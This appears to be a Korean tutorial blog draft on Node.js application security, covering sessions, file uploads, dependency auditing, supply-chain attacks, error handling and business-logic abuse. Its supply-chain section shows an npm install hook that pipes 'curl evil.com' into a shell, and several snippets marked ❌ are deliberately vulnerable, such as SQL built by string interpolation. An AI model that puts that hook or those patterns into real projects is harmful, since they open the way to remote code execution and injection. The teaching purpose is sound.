---
title: 애플리케이션 보안 - 알아야 할 핵심 개념  
published: false
description: 애플리케이션 보안의 핵심 개념들을 쉽게 설명합니다. 세션 관리, 파일 업로드, 의존성 보안, Supply Chain 공격 등에 대해 알아봅니다.
tags: security, application, nodejs, webdev
cover_image: https://example.com/your-cover-image.jpg
---

# 애플리케이션 보안 - 알아야 할 핵심 개념

애플리케이션 계층의 보안은 코드 레벨에서 시작됩니다. 이 글에서는 개발자가 반드시 알아야 할 애플리케이션 보안 개념들을 다룹니다.

---

## 1. Session Management (세션 관리) ⭐️⭐️⭐️

### 개념
세션 관리는 사용자의 인증 상태를 유지하는 메커니즘입니다. 잘못 구현하면 세션 하이재킹, 세션 고정 등의 공격에 취약합니다.

### 안전한 세션 설정

**Express.js + express-session**
```javascript
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const redis = require('redis');

// Redis 클라이언트
const redisClient = redis.createClient({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
  password: process.env.REDIS_PASSWORD
});

app.use(session({
  store: new RedisStore({ client: redisClient }),
  
  // 강력한 Secret 키
  secret: process.env.SESSION_SECRET,
  
  // 세션 ID 재생성 (Session Fixation 방지)
  resave: false,
  saveUninitialized: false,
  
  // 쿠키 설정
  cookie: {
    secure: true,           // HTTPS만
    httpOnly: true,         // JavaScript 접근 불가
    sameSite: 'strict',     // CSRF 방지
    maxAge: 1000 * 60 * 30, // 30분
    domain: '.example.com'
  },
  
  // 세션 이름 변경 (기본값 노출 방지)
  name: 'sid',
  
  // 세션 롤링 (매 요청마다 만료 시간 갱신)
  rolling: true
}));

// 로그인 시 세션 재생성
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.username, req.body.password);
  
  if (user) {
    // 기존 세션 파괴
    req.session.destroy(() => {
      // 새 세션 생성
      req.session.regenerate(() => {
        req.session.userId = user.id;
        req.session.username = user.username;
        req.session.loginTime = Date.now();
        
        res.json({ message: '로그인 성공' });
      });
    });
  } else {
    res.status(401).json({ error: '인증 실패' });
  }
});

// 로그아웃
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: '로그아웃 실패' });
    }
    res.clearCookie('sid');
    res.json({ message: '로그아웃 성공' });
  });
});
```

### 세션 하이재킹 방지

```javascript
// IP 주소와 User-Agent 검증
app.use((req, res, next) => {
  if (req.session && req.session.userId) {
    const sessionIP = req.session.ipAddress;
    const sessionUA = req.session.userAgent;
    const currentIP = req.ip;
    const currentUA = req.get('user-agent');
    
    // IP나 User-Agent가 변경되면 세션 무효화
    if (sessionIP !== currentIP || sessionUA !== currentUA) {
      logger.warn('Session hijacking attempt detected', {
        userId: req.session.userId,
        sessionIP,
        currentIP,
        sessionUA: sessionUA.substring(0, 50),
        currentUA: currentUA.substring(0, 50)
      });
      
      req.session.destroy();
      return res.status(401).json({ error: '세션이 무효화되었습니다' });
    }
  }
  next();
});

// 로그인 시 IP와 User-Agent 저장
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.username, req.body.password);
  
  if (user) {
    req.session.regenerate(() => {
      req.session.userId = user.id;
      req.session.ipAddress = req.ip;
      req.session.userAgent = req.get('user-agent');
      req.session.loginTime = Date.now();
      
      res.json({ message: '로그인 성공' });
    });
  }
});
```

### JWT와 세션 비교

```javascript
// JWT 장점: Stateless, 마이크로서비스 적합
// JWT 단점: 즉시 무효화 불가, 크기가 큼

// 세션 장점: 즉시 무효화 가능, 크기 작음
// 세션 단점: 서버 메모리 사용, 분산 환경 복잡

// 하이브리드 방식 (Refresh Token을 세션으로)
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  // Refresh Token을 세션에서 검증
  const session = await redisClient.get(`refresh:${refreshToken}`);
  
  if (!session) {
    return res.status(401).json({ error: '유효하지 않은 토큰' });
  }
  
  // 새 Access Token 발급
  const accessToken = jwt.sign(
    { userId: session.userId },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  res.json({ accessToken });
});
```

---

## 2. File Upload Security ⭐️⭐️⭐️

### 개념
파일 업로드는 가장 위험한 기능 중 하나입니다. 악성 파일 업로드, 디렉터리 트래버설, 파일 실행 등의 위험이 있습니다.

### 안전한 파일 업로드

```javascript
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');
const sharp = require('sharp');

// 1. 저장 위치 설정
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    // 웹 루트 밖에 저장
    cb(null, '/var/uploads/user-content');
  },
  
  filename: (req, file, cb) => {
    // ❌ 원본 파일명 사용 금지
    // cb(null, file.originalname);
    
    // ✅ 랜덤 파일명 생성
    const randomName = crypto.randomBytes(16).toString('hex');
    const ext = path.extname(file.originalname).toLowerCase();
    cb(null, `${randomName}${ext}`);
  }
});

// 2. 파일 검증
const fileFilter = (req, file, cb) => {
  // MIME 타입 화이트리스트
  const allowedMimes = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/pdf'
  ];
  
  // 확장자 화이트리스트
  const allowedExts = /\.(jpg|jpeg|png|gif|pdf)$/i;
  
  const mimeOk = allowedMimes.includes(file.mimetype);
  const extOk = allowedExts.test(path.extname(file.originalname));
  
  if (mimeOk && extOk) {
    cb(null, true);
  } else {
    cb(new Error('허용되지 않는 파일 형식입니다'));
  }
};

const upload = multer({
  storage: storage,
  fileFilter: fileFilter,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB
    files: 5                     // 최대 5개
  }
});

// 3. 파일 업로드 라우트
app.post('/upload', 
  authenticateToken,
  upload.single('file'),
  async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ error: '파일이 없습니다' });
      }
      
      const filePath = req.file.path;
      
      // 4. 이미지 파일인 경우 재처리 (메타데이터 제거)
      if (req.file.mimetype.startsWith('image/')) {
        await sharp(filePath)
          .rotate() // EXIF 방향 정보 적용
          .resize(2000, 2000, { fit: 'inside' })
          .toFile(filePath + '.processed');
        
        // 원본 삭제
        fs.unlinkSync(filePath);
        fs.renameSync(filePath + '.processed', filePath);
      }
      
      // 5. 바이러스 스캔 (ClamAV)
      const scanResult = await clamav.scanFile(filePath);
      if (scanResult.isInfected) {
        fs.unlinkSync(filePath);
        return res.status(400).json({ error: '악성 파일이 감지되었습니다' });
      }
      
      // 6. 데이터베이스에 정보 저장
      const file = await File.create({
        userId: req.user.id,
        filename: req.file.filename,
        originalName: req.file.originalname,
        mimeType: req.file.mimetype,
        size: req.file.size,
        path: filePath
      });
      
      res.json({
        message: '파일 업로드 성공',
        fileId: file.id,
        filename: file.filename
      });
      
    } catch (error) {
      // 에러 발생 시 업로드된 파일 삭제
      if (req.file) {
        fs.unlinkSync(req.file.path);
      }
      res.status(500).json({ error: '파일 업로드 실패' });
    }
  }
);

// 7. 파일 다운로드 (Directory Traversal 방지)
app.get('/download/:fileId', authenticateToken, async (req, res) => {
  const file = await File.findOne({
    where: { 
      id: req.params.fileId,
      userId: req.user.id // 본인 파일만 다운로드 가능
    }
  });
  
  if (!file) {
    return res.status(404).json({ error: '파일을 찾을 수 없습니다' });
  }
  
  // ✅ 안전한 경로 검증
  const safePath = path.normalize(file.path).replace(/^(\.\.(\/|\\|$))+/, '');
  const fullPath = path.join('/var/uploads/user-content', path.basename(safePath));
  
  // 경로가 업로드 디렉터리 내에 있는지 확인
  if (!fullPath.startsWith('/var/uploads/user-content')) {
    return res.status(403).json({ error: '잘못된 경로입니다' });
  }
  
  res.download(fullPath, file.originalName);
});
```

### S3 Direct Upload (더 안전)

```javascript
const AWS = require('aws-sdk');
const s3 = new AWS.S3();

// Signed URL 생성 (클라이언트가 직접 S3에 업로드)
app.post('/upload/presigned-url', authenticateToken, async (req, res) => {
  const { filename, contentType } = req.body;
  
  // 파일 형식 검증
  const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
  if (!allowedTypes.includes(contentType)) {
    return res.status(400).json({ error: '허용되지 않는 파일 형식' });
  }
  
  const fileKey = `uploads/${req.user.id}/${crypto.randomBytes(16).toString('hex')}`;
  
  const presignedUrl = s3.getSignedUrl('putObject', {
    Bucket: 'my-secure-bucket',
    Key: fileKey,
    ContentType: contentType,
    Expires: 300, // 5분
    ACL: 'private'
  });
  
  res.json({
    uploadUrl: presignedUrl,
    fileKey: fileKey
  });
});

// 업로드 완료 후 처리
app.post('/upload/complete', authenticateToken, async (req, res) => {
  const { fileKey } = req.body;
  
  // S3에 파일이 존재하는지 확인
  try {
    await s3.headObject({
      Bucket: 'my-secure-bucket',
      Key: fileKey
    }).promise();
    
    // 데이터베이스에 저장
    const file = await File.create({
      userId: req.user.id,
      fileKey: fileKey
    });
    
    res.json({ message: '업로드 완료', fileId: file.id });
  } catch (error) {
    res.status(404).json({ error: '파일을 찾을 수 없습니다' });
  }
});
```

---

## 3. Dependency Security (의존성 보안) ⭐️⭐️⭐️

### 개념
애플리케이션은 수많은 외부 라이브러리에 의존합니다. 이들 라이브러리의 취약점이 곧 애플리케이션의 취약점이 됩니다.

### npm audit

```bash
# 취약점 검사
npm audit

# 자동으로 수정 가능한 취약점 수정
npm audit fix

# breaking changes 포함하여 수정
npm audit fix --force

# 특정 취약점 무시 (임시)
npm audit --audit-level=high
```

### Snyk를 이용한 지속적인 모니터링

```bash
# Snyk 설치
npm install -g snyk

# 인증
snyk auth

# 프로젝트 테스트
snyk test

# 프로젝트 모니터링 (Snyk 대시보드에 추가)
snyk monitor

# 자동 수정
snyk fix
```

```yaml
# .github/workflows/security.yml
name: Security Check

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high
```

### Dependabot 설정

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10
    
    # 보안 업데이트만
    labels:
      - "security"
    
    # 자동 머지 (보안 패치만)
    assignees:
      - "security-team"
```

### package-lock.json 검증

```javascript
// package.json에 scripts 추가
{
  "scripts": {
    "preinstall": "node check-lockfile.js"
  }
}

// check-lockfile.js
const fs = require('fs');
const crypto = require('crypto');

const lockfile = fs.readFileSync('package-lock.json', 'utf8');
const lockfileHash = crypto.createHash('sha256').update(lockfile).digest('hex');

// 예상 해시와 비교
const expectedHash = process.env.LOCKFILE_HASH;
if (lockfileHash !== expectedHash) {
  console.error('package-lock.json이 변조되었습니다!');
  process.exit(1);
}
```

---

## 4. Supply Chain Attacks 방어 ⭐️⭐️

### 개념
Supply Chain Attack은 신뢰하는 소스(npm 패키지, Docker 이미지 등)를 통해 악성 코드를 주입하는 공격입니다.

### npm 패키지 보안

**1. 패키지 검증**
```bash
# 패키지 정보 확인
npm view express

# 다운로드 수, 마지막 업데이트 확인
npm view express downloads
npm view express time

# GitHub stars 확인
npm repo express
```

**2. 의심스러운 패키지 패턴**
```javascript
// ❌ 의심스러운 패키지 특징
// - 이름이 유명 패키지와 유사 (typosquatting)
//   예: react → reect, lodash → loadash
// - 최근에 생성됨 (< 1개월)
// - 다운로드 수 매우 적음 (< 1000/week)
// - GitHub 저장소 없음
// - 설명이 부실하거나 없음
// - 의존성이 매우 많음

// ✅ 신뢰할 수 있는 패키지 확인
// - 공식 문서 있음
// - GitHub stars 많음 (>1000)
// - 활발한 유지보수 (최근 업데이트)
// - 많은 다운로드 수
// - 대기업/유명 개발자 관리
```

**3. npm Scripts 주의**
```json
// package.json
{
  "scripts": {
    // ❌ 의심스러운 스크립트
    "install": "node -e \"require('child_process').exec('curl evil.com | sh')\"",
    "postinstall": "node malicious.js",
    
    // ✅ 정상적인 스크립트
    "build": "webpack --config webpack.config.js",
    "test": "jest"
  }
}
```

### Docker 이미지 보안

```dockerfile
# ❌ 위험한 방법
FROM node:latest

# ✅ 안전한 방법 - 특정 버전 명시
FROM node:18.17.0-alpine@sha256:abc123...

# 공식 이미지만 사용
# - node (공식)
# - postgres (공식)
# 비공식 이미지 사용 금지
```

---

## 5. Error Handling & Information Disclosure ⭐️⭐️

### 개념
에러 메시지를 통해 시스템 정보가 노출되면 공격자에게 유용한 정보를 제공하게 됩니다.

### 안전한 에러 처리

```javascript
// ❌ 위험한 에러 처리
app.get('/api/user/:id', async (req, res) => {
  try {
    const user = await db.query(`SELECT * FROM users WHERE id = ${req.params.id}`);
    res.json(user);
  } catch (error) {
    // 스택 트레이스, 쿼리 노출
    res.status(500).json({ error: error.message, stack: error.stack });
  }
});

// ✅ 안전한 에러 처리
app.get('/api/user/:id', async (req, res) => {
  try {
    const user = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
    
    if (!user) {
      return res.status(404).json({ error: '사용자를 찾을 수 없습니다' });
    }
    
    res.json(user);
  } catch (error) {
    // 로깅 (내부용)
    logger.error('Database error', {
      error: error.message,
      stack: error.stack,
      userId: req.params.id,
      ip: req.ip
    });
    
    // 사용자에게는 일반적인 메시지만
    res.status(500).json({ error: '요청 처리 중 오류가 발생했습니다' });
  }
});

// 전역 에러 핸들러
app.use((err, req, res, next) => {
  // 개발 환경에서만 상세 정보
  const isDev = process.env.NODE_ENV === 'development';
  
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
    ip: req.ip
  });
  
  res.status(err.status || 500).json({
    error: isDev ? err.message : '서버 오류가 발생했습니다',
    ...(isDev && { stack: err.stack })
  });
});
```

### Express.js 프로덕션 설정

```javascript
// app.js
const express = require('express');
const app = express();

// 프로덕션 환경 설정
if (process.env.NODE_ENV === 'production') {
  // X-Powered-By 헤더 제거
  app.disable('x-powered-by');
  
  // 자세한 에러 메시지 비활성화
  app.set('env', 'production');
}

// helmet으로 보안 헤더 설정
const helmet = require('helmet');
app.use(helmet());

// 에러 페이지도 정보 노출 방지
app.use((req, res) => {
  res.status(404).json({ error: '페이지를 찾을 수 없습니다' });
});
```

---

## 6. Business Logic Abuse 방지 ⭐️⭐️

### 개념
비즈니스 로직의 결함을 악용하여 부정한 이득을 취하는 공격입니다.

### 실제 사례와 방어

**1. 쿠폰 중복 사용**
```javascript
// ❌ 취약한 코드
app.post('/apply-coupon', async (req, res) => {
  const { couponCode } = req.body;
  
  const coupon = await Coupon.findOne({ code: couponCode });
  if (coupon && coupon.isValid) {
    req.session.discount = coupon.amount;
    res.json({ message: '쿠폰 적용 완료' });
  }
});

// ✅ 안전한 코드
app.post('/apply-coupon', async (req, res) => {
  const { couponCode } = req.body;
  const userId = req.user.id;
  
  // 트랜잭션 시작
  const transaction = await sequelize.transaction();
  
  try {
    // 쿠폰 존재 및 유효성 확인
    const coupon = await Coupon.findOne({
      where: { 
        code: couponCode,
        isValid: true,
        expiresAt: { [Op.gt]: new Date() }
      },
      lock: transaction.LOCK.UPDATE, // 행 잠금
      transaction
    });
    
    if (!coupon) {
      await transaction.rollback();
      return res.status(404).json({ error: '유효하지 않은 쿠폰' });
    }
    
    // 이미 사용했는지 확인
    const usage = await CouponUsage.findOne({
      where: { couponId: coupon.id, userId },
      transaction
    });
    
    if (usage) {
      await transaction.rollback();
      return res.status(400).json({ error: '이미 사용한 쿠폰입니다' });
    }
    
    // 사용 기록 생성
    await CouponUsage.create({
      couponId: coupon.id,
      userId,
      usedAt: new Date()
    }, { transaction });
    
    // 쿠폰 사용 횟수 증가
    await coupon.increment('usageCount', { transaction });
    
    await transaction.commit();
    
    res.json({ 
      message: '쿠폰 적용 완료',
      discount: coupon.amount 
    });
    
  } catch (error) {
    await transaction.rollback();
    res.status(500).json({ error: '쿠폰 적용 실패' });
  }
});
```

**2. Race Condition 방지**
```javascript
// ❌ Race Condition 취약
app.post('/purchase', async (req, res) => {
  const product = await Product.findByPk(req.body.productId);
  
  if (product.stock > 0) {
    // 여러 요청이 동시에 들어오면 재고보다 많이 판매될 수 있음
    await product.decrement('stock');
    await Order.create({ productId: product.id, userId: req.user.id });
    res.json({ message: '구매 완료' });
  }
});

// ✅ 트랜잭션과 행 잠금 사용
app.post('/purchase', async (req, res) => {
  const transaction = await sequelize.transaction();
  
  try {
    const product = await Product.findByPk(req.body.productId, {
      lock: transaction.LOCK.UPDATE,
      transaction
    });
    
    if (!product || product.stock < 1) {
      await transaction.rollback();
      return res.status(400).json({ error: '재고 부족' });
    }
    
    // 원자적 연산
    const [updatedRows] = await Product.update(
      { stock: sequelize.literal('stock - 1') },
      {
        where: {
          id: product.id,
          stock: { [Op.gt]: 0 } // 재고가 0보다 클 때만 업데이트
        },
        transaction
      }
    );
    
    if (updatedRows === 0) {
      await transaction.rollback();
      return res.status(400).json({ error: '재고 부족' });
    }
    
    await Order.create({
      productId: product.id,
      userId: req.user.id
    }, { transaction });
    
    await transaction.commit();
    res.json({ message: '구매 완료' });
    
  } catch (error) {
    await transaction.rollback();
    res.status(500).json({ error: '구매 실패' });
  }
});
```

**3. 가격 변조 방지**
```javascript
// ❌ 클라이언트에서 가격 전송
app.post('/checkout', async (req, res) => {
  const { productId, price, quantity } = req.body;
  
  // 공격자가 price를 1원으로 조작 가능
  const total = price * quantity;
  
  await Payment.create({ total, userId: req.user.id });
});

// ✅ 서버에서 가격 조회
app.post('/checkout', async (req, res) => {
  const { productId, quantity } = req.body;
  
  // 서버에서 실제 가격 조회
  const product = await Product.findByPk(productId);
  
  if (!product) {
    return res.status(404).json({ error: '상품을 찾을 수 없습니다' });
  }
  
  // 서버에서 계산
  const total = product.price * quantity;
  
  await Payment.create({
    productId: product.id,
    quantity,
    unitPrice: product.price,
    total,
    userId: req.user.id
  });
  
  res.json({ total });
});
```

---

## 결론

애플리케이션 보안 체크리스트:

### 필수 보안 조치 (⭐️⭐️⭐️)
- ✅ 안전한 세션 관리 (HttpOnly, Secure, SameSite)
- ✅ 파일 업로드 검증 (MIME, 확장자, 크기)
- ✅ 의존성 정기 점검 (npm audit, Snyk)

### 중요 보안 조치 (⭐️⭐️)
- ✅ 에러 메시지 정보 노출 방지
- ✅ 비즈니스 로직 Race Condition 방지
- ✅ Supply Chain Attack 방어

### 추가 보안 강화 (⭐️)
- ✅ Dependabot 자동 업데이트
- ✅ 파일 업로드 바이러스 스캔
- ✅ 트랜잭션으로 데이터 무결성 보장

**애플리케이션 보안은 코드 리뷰와 지속적인 모니터링이 핵심입니다!**
